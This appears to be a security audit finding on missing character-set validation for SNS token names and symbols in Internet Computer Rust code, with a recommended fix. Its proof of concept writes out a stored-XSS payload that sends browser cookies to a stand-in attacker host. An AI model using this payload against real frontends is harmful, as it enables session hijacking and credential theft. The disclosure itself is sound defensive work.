### Title
Missing Character-Set Validation in SNS Token Name/Symbol Allows Stored Injection via Governance Proposal Rendering — (File: `rs/nervous_system/common/src/ledger_validation.rs`)

---

### Summary

The `validate_token_symbol` and `validate_token_name` functions in `rs/nervous_system/common/src/ledger_validation.rs` enforce only length bounds and a banned-word list, but perform **no character-set validation**. Arbitrary Unicode, HTML tags, and script-injection payloads are accepted. These unvalidated strings are (1) rendered verbatim into SNS governance proposal text stored on-chain, and (2) stored in the ICRC-1 ledger and returned via public query endpoints (`icrc1_name`, `icrc1_symbol`, `icrc1_metadata`). Any frontend that displays this data without independent sanitization is vulnerable to stored injection.

---

### Finding Description

`validate_token_symbol` checks only byte-length (3–10), leading/trailing whitespace, and a two-entry banned list. `validate_token_name` checks only byte-length (4–255), leading/trailing whitespace, and a two-entry banned list. Neither function checks for non-ASCII characters, HTML metacharacters (`<`, `>`, `"`, `'`, `&`), or control characters. [1](#0-0) 

By contrast, the `CkTokenSymbol` type used in the ckETH minter explicitly rejects non-ASCII input: [2](#0-1) 

The SNS governance proposal handler `validate_and_render_manage_ledger_parameters` calls `validate_token_name` / `validate_token_symbol` and then interpolates the accepted value directly into a rendered markdown string that is stored on-chain as the proposal's human-readable description: [3](#0-2) 

If the proposal is executed, the SNS governance canister upgrades the ICRC-1 ledger with the malicious string. The ICRC-1 ledger's `upgrade` function stores `token_name` and `token_symbol` with **zero additional validation**: [4](#0-3) 

The stored values are then returned verbatim by public query endpoints: [5](#0-4) [6](#0-5) 

The same path exists at SNS creation time via `SnsInitPayload::validate_token_name` / `validate_token_symbol`: [7](#0-6) 

---

### Impact Explanation

An attacker who controls an SNS neuron can submit a `ManageLedgerParameters` proposal with `token_name` set to a full HTML/script payload (up to 255 bytes). The rendered proposal text — stored on-chain and returned by `get_proposal` — contains the raw payload. If the proposal passes, the ICRC-1 ledger's `icrc1_name()`, `icrc1_symbol()`, and `icrc1_metadata()` query responses also carry the payload. Any frontend (NNS dapp, SNS dapp, third-party wallet) that renders proposal descriptions or token metadata without independent sanitization will execute the injected script in the user's browser, enabling session hijacking, credential theft, or unauthorized transaction signing.

---

### Likelihood Explanation

Any holder of SNS voting power can submit a `ManageLedgerParameters` proposal. The proposal is displayed to all voters immediately upon submission — before any vote is cast — so the injection surface is active even if the proposal is ultimately rejected. SNS governance UIs routinely render proposal descriptions as rich text. The missing check is a single-line omission in a shared validation library, making it easy to overlook and easy to exploit.

---

### Recommendation

Add a character-set check to both `validate_token_symbol` and `validate_token_name` in `rs/nervous_system/common/src/ledger_validation.rs`, mirroring the pattern already used in `CkTokenSymbol::from_str`:

```rust
if !token_symbol.is_ascii() {
    return Err("Token symbol must contain only ASCII characters".to_string());
}
// Optionally restrict further to alphanumeric + common ticker chars:
if !token_symbol.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {
    return Err("Token symbol must contain only alphanumeric characters".to_string());
}
```

Apply the same check to `validate_token_name` (allowing a broader but still safe character set, e.g., printable ASCII only). The ICRC-1 ledger's `upgrade` function should also validate `token_name` and `token_symbol` before storing them, rather than relying solely on callers.

---

### Proof of Concept

1. Obtain an SNS neuron with any voting power.
2. Submit a `ManageLedgerParameters` proposal:
   ```
   token_name = "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
   ```
   (58 bytes — within the 255-byte limit; passes `validate_token_name` because it has no leading/trailing whitespace and is not in the banned list.)
3. `validate_and_render_manage_ledger_parameters` produces the rendered string:
   ```
   # Proposal to change ledger parameters:
   # Set token name: <script>fetch('https://attacker.com/?c='+document.cookie)</script>.
   ```
   This string is stored in the SNS governance canister's proposal state.
4. Any voter who views the proposal in a frontend that renders the description as HTML executes the script.
5. If the proposal passes, `icrc1_name()` returns the same payload to every caller, extending the injection surface to all token-listing UIs.
